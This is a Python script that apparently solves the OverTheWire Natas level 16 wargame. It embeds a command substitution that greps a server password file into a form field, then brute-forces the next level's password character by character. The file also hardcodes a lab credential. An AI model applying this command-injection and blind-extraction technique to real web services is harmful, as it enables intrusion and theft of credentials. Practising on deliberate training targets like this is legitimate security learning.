#!/usr/bin/env python

#Importing Packages and Libraries
import requests
import re
import string

#Declaring the Authentication
username = 'natas16'
password = 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'
url = 'http://%s.natas.labs.overthewire.org/' %username
characters = string.ascii_letters + string.digits

#Functions
session = requests.Session()

seen_password = list()

#Using Wile Loop for Brute Forcing
while (len(seen_password) < 32):

	for character in characters:
		print("Trying the character to match the Password with:", "".join(seen_password) + character)

		response = session.post(url, data = {"needle" : "anythings$(grep ^" + "".join(seen_password) + character + " /etc/natas_webpass/natas17)" }, auth = (username, password))
		content = response.text

		returned = re.findall( '<pre>\n(.*)\n</pre>', content)

		if (not returned):
			seen_password.append(character)
			break